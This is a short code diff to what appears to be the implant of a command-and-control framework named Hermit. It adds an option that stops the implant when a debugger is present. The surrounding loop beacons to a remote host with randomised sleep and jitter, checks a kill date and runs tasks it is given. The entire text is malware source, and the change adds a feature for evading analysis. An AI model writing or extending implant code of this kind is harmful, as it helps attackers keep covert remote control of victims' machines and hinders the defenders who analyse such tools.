@@ -7,6 +7,7 @@ namespace Hermit
 		INT 			nCmdShow,
 		LPCWSTR			lpPayloadType,
 		BOOL			bIndirectSyscalls,
+		BOOL			bAntiDebug,
 		LPCWSTR			lpProtocol,
 		LPCWSTR 		lpHost,
 		INTERNET_PORT 	nPort,
@@ -69,6 +70,12 @@ namespace Hermit
 		// pState->pSocket 			= NULL;
 		pState->bQuit 				= FALSE;
 
+		// Anti-Debug
+		if (bAntiDebug)
+		{
+			Technique::AntiDebug::StopIfDebug(pState->pProcs);
+		}
+
 		// Get system information
 		std::wstring wInfoJson = Handler::GetInitialInfoJSON(pState);
 
@@ -88,10 +95,14 @@ namespace Hermit
 			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);
 
 			if (Handler::IsKillDateReached(pState->nKillDate))
+			{
 				pState->bQuit = TRUE;
+			}
 
 			if (Handler::CheckIn(pState, wInfoJson))
+			{
 				break;
+			}
 		} while (1 == 1);
 
 		// Tasks
@@ -100,7 +111,9 @@ namespace Hermit
 			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);
 
 			if (Handler::IsKillDateReached(pState->nKillDate))
+			{
 				pState->bQuit = TRUE;
+			}
 
 			Handler::Task(pState);
 
